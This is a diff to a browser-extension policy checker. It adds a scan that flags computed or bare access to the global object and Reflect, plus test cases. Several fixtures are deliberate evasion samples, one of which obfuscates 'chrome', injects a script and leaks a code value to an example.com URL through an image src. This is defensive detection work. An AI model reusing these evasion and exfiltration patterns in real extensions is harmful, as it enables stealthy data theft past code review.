@@ -440,6 +440,64 @@ function navigationHits(text, label, rel) {
   return hits;
 }
 
+// The global object, by the names it goes by in a page or a worker. Through it a file can reach
+// chrome, and so any API the checks here read by its spelling, under a computed name
+// (globalThis[c], Reflect.get(self, c), Object.values(window), const g = top; g[c]). So in every
+// .js file each of these names may stand only as <name>.<member> (or <name>?.<member>), after a
+// '.' as well (window.self[c], const g = window.window), and Reflect may not be named at all.
+const GLOBAL_OBJECTS = ['globalThis', 'self', 'window', 'top', 'parent', 'frames', 'opener'];
+
+// The one exception: a local of one of those names declared as a statement `const <name> = ...`
+// (not var, not in a for header) may be read bare from its declaration to the end of the brace
+// block that directly holds it (lib/fieldfind.js and lib/autofill-worker.js keep the parent
+// element in `const parent`); a computed access on it still fails. A file the tokenizer cannot
+// read is a hit, not a skipped file; an escape inside a string is not (this scan never reads a
+// string's value), an escaped identifier is. → [hit] (rule `navigation`)
+function globalObjectHits(text, label) {
+  const { tokens, problems } = jsTokens(text, { escapes: true });
+  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
+  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what} (the file cannot be read for global-object access)`);
+  const closeOf = new Map(); // index of '{' -> index of its '}'
+  const open = [];
+  tokens.forEach((tok, k) => {
+    if (isPunct(tok, '{')) open.push(k);
+    else if (isPunct(tok, '}') && open.length) closeOf.set(open.pop(), k);
+  });
+  const locals = []; // [name, first token index, end token index]
+  const enclosing = [];
+  tokens.forEach((tok, k) => {
+    if (isPunct(tok, '{')) enclosing.push(k);
+    else if (isPunct(tok, '}')) enclosing.pop();
+    else if (
+      tok.t === 'id' &&
+      GLOBAL_OBJECTS.includes(tok.v) &&
+      tokens[k - 1]?.t === 'id' &&
+      tokens[k - 1].v === 'const' &&
+      !isPunct(tokens[k - 2], '(') &&
+      isPunct(tokens[k + 1], '=')
+    ) {
+      const block = enclosing[enclosing.length - 1];
+      locals.push([tok.v, k, block === undefined ? tokens.length : (closeOf.get(block) ?? tokens.length)]);
+    }
+  });
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id') return;
+    if (tok.v === 'Reflect') {
+      hits.push(`${at(tok)} Reflect (it reaches an object's properties by computed names)`);
+      return;
+    }
+    if (!GLOBAL_OBJECTS.includes(tok.v)) return;
+    const next = tokens[k + 1];
+    if (isDot(next) && tokens[k + 2]?.t === 'id') return;
+    const dotted = isDot(tokens[k - 1]);
+    const computed = isPunct(next, '[') || (isPunct(next, '?.') && isPunct(tokens[k + 2], '['));
+    if (!dotted && !computed && locals.some(([name, from, to]) => name === tok.v && k >= from && k < to)) return;
+    const shown = `${dotted ? '.' : ''}${tok.v}`;
+    hits.push(`${at(tok)} ${shown} other than as ${shown}.<member> (${computed ? 'a computed access on the global object' : 'the global object as a value'} reaches chrome and every API by a computed name)`);
+  });
+  return hits;
+}
+
 // chrome.scripting outside MANIFEST_POLICY.scriptingFiles, and chrome.permissions outside
 // MANIFEST_POLICY.permissionsFiles other than the members in permissionsMembersAnywhere.
 // Like the chrome.tabs check, any reference counts, not only a call, and a reference without a
@@ -524,9 +582,10 @@ const NUMBER = /0[xXbBoO][\da-fA-F_]+n?|\d[\d_]*\.?[\d_]*(?:[eE][+-]?\d+)?n?|\.\
 const SIMPLE_ESCAPES = { n: '\n', t: '\t', r: '\r', b: '\b', f: '\f', v: '\v' };
 
 // The body of a string literal (quote at `start`) or of a template part (`start` just after the
-// backtick or the '}' that closes a substitution), with simple escapes decoded.
-// → { end: index after it, value, open: ended at '${' } or { problem }
-function readQuoted(text, start, quote) {
+// backtick or the '}' that closes a substitution), with simple escapes decoded. With `escapes`,
+// \x, \u and octal escapes are kept as written instead of refused (for a scan that never
+// compares a string's value). → { end: index after it, value, open: ended at '${' } or { problem }
+function readQuoted(text, start, quote, escapes = false) {
   let value = '';
   for (let i = quote === '`' ? start : start + 1; i < text.length; i += 1) {
     const c = text[i];
@@ -540,7 +599,7 @@ function readQuoted(text, start, quote) {
     const n = text[i + 1] ?? '';
     // \x, \u and octal escapes spell a character by number; a scan that compares names cannot
     // follow them, so they are refused (write the character itself).
-    if (/[xu0-9]/.test(n)) return { problem: `escape \\${n} in a ${quote === '`' ? 'template' : 'string'} literal` };
+    if (/[xu0-9]/.test(n) && !escapes) return { problem: `escape \\${n} in a ${quote === '`' ? 'template' : 'string'} literal` };
     if (n === '\r' && text[i + 2] === '\n') i += 1;
     else if (!LINE_END.test(n)) value += SIMPLE_ESCAPES[n] ?? n;
     i += 1;
@@ -587,10 +646,10 @@ function regexAllowed(prev) {
 // A small JavaScript tokenizer for the content-script rule: comments are dropped; strings,
 // template parts and regular expressions become single tokens, so names inside them are not code.
 // It fails closed: what it cannot read (an unterminated literal or comment, a backslash in code,
-// with `strict` a '/' that may be division or a regular expression) is a problem, and the rest of
-// the file is not scanned.
+// with `strict` a '/' that may be division or a regular expression, without `escapes` a \x, \u or
+// octal escape in a literal) is a problem, and the rest of the file is not scanned.
 // → { tokens: [{ t: 'id'|'num'|'str'|'tpl'|'re'|'p', v, i, open? }], problems: [{ i, what }] }
-function jsTokens(text, { strict = false } = {}) {
+function jsTokens(text, { strict = false, escapes = false } = {}) {
   const tokens = [];
   const problems = [];
   const braces = []; // one entry per open '{': true when it is a template's '${'
@@ -614,7 +673,7 @@ function jsTokens(text, { strict = false } = {}) {
     } else if (c === '"' || c === "'" || c === '`' || (c === '}' && braces[braces.length - 1] === true)) {
       if (c === '}') braces.pop();
       const quote = c === '}' ? '`' : c;
-      const r = readQuoted(text, c === '}' || c === '`' ? i + 1 : i, quote);
+      const r = readQuoted(text, c === '}' || c === '`' ? i + 1 : i, quote, escapes);
       if (r.problem) {
         problems.push({ i, what: r.problem });
         break;
@@ -1356,6 +1415,7 @@ function runChecks(extDir) {
     dynamic.push(...findAll(text, DYNAMIC_CODE_PATTERNS, label(f.rel)));
     urls.push(...findAll(text, URL_PATTERNS, label(f.rel)));
     navigation.push(...navigationHits(text, label(f.rel), f.rel));
+    if (f.rel.endsWith('.js')) navigation.push(...globalObjectHits(text, label(f.rel)));
     const scoped = scopedApiHits(text, label(f.rel), f.rel);
     scripting.push(...scoped.scripting);
     permissionsUse.push(...scoped.permissions);
@@ -1991,7 +2051,7 @@ const CASES = [
   ['clean', () => {}, []],
   ['ok-homepage-exact', (fx) => (fx.manifest.homepage_url = HOMEPAGE_URL), []],
   ['ok-vendor-exempt-from-scan', addJs('vendor/jsQR.js', "fetch('https://x.test/'); eval('1'); new WebSocket('wss://x'); window.open('https://x.test/');\n"), []],
-  ['ok-word-boundaries', addJs('lib/words.js', '// prefetch(x) retrieval(y) refetch(z) reopen(x) geolocation = 1\nconst fetched = 1; const evaluate = () => 0; const opener = window.opener;\n'), []],
+  ['ok-word-boundaries', addJs('lib/words.js', '// prefetch(x) retrieval(y) refetch(z) reopen(x) geolocation = 1\nconst fetched = 1; const evaluate = () => 0; const opener = window.opener?.closed;\n'), []],
   ['ok-ds-store-ignored', (fx) => (fx.files['popup/.DS_Store'] = Buffer.from([0, 0, 0, 1, 66, 117, 100, 49])), []],
   ['ok-sums-binary-marker', editSums((text) => text.replace(/^([0-9a-f]{64}) {2}/gm, '$1 *')), []],
   [
@@ -2241,6 +2301,61 @@ const CASES = [
   ],
   ['nav-set-uninstall-url', addJs('lib/x.js', 'chrome.runtime.setUninstallURL(chrome.runtime.getManifest().homepage_url);\n'), ['navigation']],
   ['nav-in-comment', addJs('lib/x.js', '// do not call window.open(url) here\n'), ['navigation']],
+  // The global object, under any of its names, only as <name>.<member>: a computed access on it,
+  // the object as a value (an alias, an argument, a destructuring source) or Reflect would reach
+  // chrome by a computed name, past every check that reads chrome.<api> by its spelling.
+  [
+    'global-worker-leak',
+    appendJs(
+      'lib/autofill-worker.js',
+      "const c = 'chr' + 'ome', f = 'fu' + 'nc';\nfunction grab(code) { document.querySelector('img').src = '//example.com/?code=' + code; }\nexport function leak(tabId) {\n  const o = { target: { tabId } };\n  o[f] = grab;\n  return globalThis[c].scripting.executeScript(o);\n}\n",
+    ),
+    ['navigation'],
+    /globalThis other than as globalThis\.<member> \(a computed access on the global object/,
+  ],
+  [
+    'global-settings-tabs-scripting-permissions',
+    appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nexport const probe = (u, o) => { globalThis[c].tabs.create({ url: u }); globalThis[c].scripting.executeScript(o); globalThis[c].permissions.request(o); };\n"),
+    ['navigation'],
+    /globalThis other than as globalThis\.<member> \(a computed access/,
+  ],
+  ['global-reflect-get', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nexport const api = () => Reflect.get(globalThis, c);\n"), ['navigation'], /Reflect \(it reaches/],
+  // Each part alone: Reflect with no global name, and the global object as an argument.
+  ['global-reflect-alone', appendJs('popup/settings.js', 'export const read = (o, k) => Reflect.get(o, k);\n'), ['navigation'], /Reflect \(it reaches/],
+  ['global-object-values', appendJs('popup/settings.js', 'export const all = () => Object.values(globalThis);\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
+  ['global-self-alias', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nconst g = self;\nexport const api = () => g[c];\n"), ['navigation'], /self other than as self\.<member> \(the global object as a value/],
+  ['global-destructure-assignment', appendJs('popup/settings.js', 'let x;\n({ chrome: x } = globalThis);\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
+  ['global-computed-destructure', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nconst { [c]: x } = self;\n"), ['navigation'], /self other than as self\.<member> \(the global object as a value/],
+  ['global-object-assign', appendJs('popup/settings.js', 'export const copy = () => Object.assign({}, window);\n'), ['navigation'], /window other than as window\.<member>/],
+  ['global-get-own-property-descriptor', appendJs('popup/settings.js', 'export const api = (c) => Object.getOwnPropertyDescriptor(top, c).value;\n'), ['navigation'], /top other than as top\.<member>/],
+  ['global-optional-computed', appendJs('popup/settings.js', 'export const api = (c) => globalThis?.[c];\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(a computed access/],
+  ['global-parenthesized', appendJs('popup/settings.js', 'export const api = (c) => (globalThis)[c];\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
+  ['global-shorthand-property', appendJs('popup/settings.js', 'export const box = { window };\n'), ['navigation'], /window other than as window\.<member>/],
+  ['global-frames-opener-computed', appendJs('popup/settings.js', 'export const api = (c) => [frames[c], opener[c]];\n'), ['navigation'], /opener other than as opener\.<member> \(a computed access/],
+  // After a '.', too: window.self, window.window and the like are the global object again.
+  ['global-dotted-computed', appendJs('popup/settings.js', 'export const api = (c) => window.self[c];\n'), ['navigation'], /\.self other than as \.self\.<member> \(a computed access/],
+  ['global-dotted-alias', appendJs('popup/settings.js', 'const g = window.window;\n'), ['navigation'], /\.window other than as \.window\.<member> \(the global object as a value/],
+  // A local `const parent = ...` may be read bare in its own block, after its declaration; not a
+  // for-of variable, not from another function, and never with a computed access.
+  ['global-parent-for-of', appendJs('popup/settings.js', 'for (const parent of list) {}\nconst g = parent;\n'), ['navigation'], /parent other than as parent\.<member> \(the global object as a value/],
+  [
+    'global-parent-other-function',
+    appendJs('popup/settings.js', 'function a(el) {\n  const parent = el.parentElement;\n  return parent;\n}\nfunction b() {\n  const g = parent;\n  return [a, g];\n}\n'),
+    ['navigation'],
+    /settings\.js:\d+ parent other than as parent\.<member> \(the global object as a value/,
+  ],
+  ['global-parent-local-computed', appendJs('popup/settings.js', 'export function a(el, c) {\n  const parent = el.parentElement;\n  return parent[c];\n}\n'), ['navigation'], /parent other than as parent\.<member> \(a computed access/],
+  [
+    'ok-global-members-and-local-parent',
+    appendJs(
+      'popup/settings.js',
+      'export const shut = () => window.close();\nconst key = globalThis.crypto?.subtle;\nexport function groupOf(el) {\n  const parent = el.parentElement;\n  if (parent && parent.parentElement) return parent.parentElement;\n  return parent || key;\n}\n',
+    ),
+    [],
+  ],
+  // Fails closed: a file it cannot read is a hit. An escape inside a string is readable.
+  ['global-escaped-identifier', appendJs('popup/settings.js', 'export const api = (c) => wind\\u006fw[c];\n'), ['navigation'], /cannot be read for global-object access/],
+  ['ok-global-string-escape', appendJs('popup/settings.js', "export const dot = '\\u00b7';\n"), []],
 
   // chrome.scripting: lib/autofill-worker.js only, by path, any reference.
   ['scripting-in-popup', appendJs('popup/popup.js', 'chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => 0 });\n'), ['scripting-api']],
@@ -2330,7 +2445,8 @@ const CASES = [
   ['content-optional-member', appendContent("field?.setAttribute('srcset', u);\n"), ['content-script-sinks'], /\.setAttribute is not on/],
   ['content-comment-between', appendContent('field /* x */ .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
   ['content-newline-between', appendContent('field\n  .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
-  ['content-escaped-identifier', appendContent('field.\\u0073rc = u;\n'), ['content-script-sinks'], /backslash outside a string/],
+  // What the tokenizer cannot read also fails the global-object scan (navigation), which reads every .js file.
+  ['content-escaped-identifier', appendContent('field.\\u0073rc = u;\n'), ['navigation', 'content-script-sinks'], /backslash outside a string/],
   ['content-string-escape', appendContent("const key = '\\x73rc';\nfield[key] = u;\n"), ['content-script-sinks'], /escape \\x in a string/],
   ['content-sink-name-string', appendContent("const key = 'src';\nfield[key] = u;\n"), ['content-script-sinks'], /"src" names a URL or markup sink/],
   // A line comment ends at U+2028 as at '\n': what follows on the same line is code.
@@ -2355,9 +2471,9 @@ const CASES = [
   ['content-attributes-write', appendContent('Array.from(field.attributes).forEach((a) => { a.value = u; });\n'), ['content-script-sinks'], /\.attributes is not on/],
   // A '/' that may be division or a regular expression is not guessed at: either guess can put
   // later code inside a literal the scan skips.
-  ['content-slash-after-paren', appendContent("if (field) /'/.test(code); field.src = u; const q = '/';\n"), ['content-script-sinks'], /'\/' right after '\)'/],
+  ['content-slash-after-paren', appendContent("if (field) /'/.test(code); field.src = u; const q = '/';\n"), ['navigation', 'content-script-sinks'], /'\/' right after '\)'/],
   ['content-slash-after-brace', appendContent('if (code) { look(); } /x/.test(code);\n'), ['content-script-sinks'], /'\/' right after '\}'/],
-  ['content-slash-after-of', appendContent('const of = 4;\nconst half = of / 2;\n'), ['content-script-sinks'], /'\/' right after 'of'/],
+  ['content-slash-after-of', appendContent('const of = 4;\nconst half = of / 2;\n'), ['navigation', 'content-script-sinks'], /'\/' right after 'of'/],
   ['ok-content-array-destructuring-and-literals', appendContent("const [first, second] = [1, 2];\nconst opts = { once: true, bubbles: false };\nconst half = code.length / 2;\nfunction take(a, [b] = []) { return a + b + first + second + half; }\nwindow.addEventListener('load', look, opts);\n"), []],
   // Acting on the page: other events, clicks and submissions.
   ['content-custom-event', appendContent("field.dispatchEvent(new CustomEvent('x', { detail: code }));\n"), ['content-script-sinks'], /new CustomEvent \(/],
@@ -2369,8 +2485,8 @@ const CASES = [
   ['content-protocol-relative-string', appendContent("const beacon = '//collect.example/p';\n"), ['content-script-sinks'], /protocol-relative URL/],
   ['content-css-url-string', appendContent("const css = 'background: url(/p)';\n"), ['content-script-sinks'], /holds a CSS url\(/],
   // What the scan cannot read fails rather than passing unread.
-  ['content-unterminated-string', appendContent("const s = 'abc;\n"), ['content-script-sinks'], /unterminated string literal/],
-  ['content-unterminated-comment', appendContent('/* never closed\nfield.src = u;\n'), ['content-script-sinks'], /unterminated comment/],
+  ['content-unterminated-string', appendContent("const s = 'abc;\n"), ['navigation', 'content-script-sinks'], /unterminated string literal/],
+  ['content-unterminated-comment', appendContent('/* never closed\nfield.src = u;\n'), ['navigation', 'content-script-sinks'], /unterminated comment/],
   // Both files are held to it, lib/fieldfind.js as much as content/autofill.js.
   ['content-fieldfind-scanned', appendJs('lib/fieldfind.js', "globalThis.parent.postMessage(1, '*');\n"), ['content-script-sinks'], /fieldfind\.js:\d+ \.parent is not on/],
   // Must stay clean: the listeners, timers and reads the content script may add; sink names in
@@ -2432,7 +2548,7 @@ const CASES = [
   ['registration-shorthand', editWorker('js: CONTENT_SCRIPTS', 'js'), ['content-script-sinks'], /js named other than as the js: key/],
   ['registration-member-assignment', appendJs('lib/autofill-worker.js', "export function widen(script) { script.js = ['content/other.js']; }\n"), ['content-script-sinks'], /js named other than as the js: key/],
   ['registration-without-js-key', editWorker(', js: CONTENT_SCRIPTS', ''), ['content-script-sinks'], /(?:register|update)ContentScripts without a js: key/],
-  ['registration-unreadable', appendJs('lib/autofill-worker.js', 'const broken = `x;\n'), ['content-script-sinks'], /cannot be read/],
+  ['registration-unreadable', appendJs('lib/autofill-worker.js', 'const broken = `x;\n'), ['navigation', 'content-script-sinks'], /cannot be read/],
   ['content-script-file-missing', (fx) => delete fx.files['lib/fieldfind.js'], ['content-script-sinks'], /missing \(listed in contentScriptFiles\)/],
   // A write to a computed member: refused unless into an object the file made (const x = {},
   // bound nowhere else); a computed read followed by an allowed member stays allowed.
@@ -2544,7 +2660,7 @@ const CASES = [
   ['scripting-template-computed-key', appendJs('lib/autofill-worker.js', 'const replacement = { [`func`]: grab };\n'), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
   ['scripting-string-computed-key', appendJs('lib/autofill-worker.js', "const replacement = { ['fu' + 'nc']: grab };\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
   ['scripting-string-computed-pattern-key', appendJs('lib/autofill-worker.js', "const { ['func']: pick } = replacement;\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
-  ['scripting-string-member-access', appendJs('lib/autofill-worker.js', "export const api = () => globalThis['chr' + 'ome'];\n"), ['content-script-sinks'], /computed member access with a string or template key in a scripting file/],
+  ['scripting-string-member-access', appendJs('lib/autofill-worker.js', "export const api = () => globalThis['chr' + 'ome'];\n"), ['navigation', 'content-script-sinks'], /computed member access with a string or template key in a scripting file/],
   ['scripting-string-member-write', appendJs('lib/autofill-worker.js', "export function widen(options) { options['fu' + 'nc'] = grab; }\n"), ['content-script-sinks'], /computed member access with a string or template key in a scripting file/],
   ['ok-scripting-string-arrays-and-identifier-keys', appendJs('lib/autofill-worker.js', "const MODES = ['a', `b`];\nconst pairs = [['k', 1], ['l', 2]];\nexport const pick = (o, key) => o[key] ?? MODES[0] ?? pairs[1];\n"), []],
   ['injected-shadowed-param', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, fillFocused = grab) {'), ['content-script-sinks'], /fillFocused named other than/],
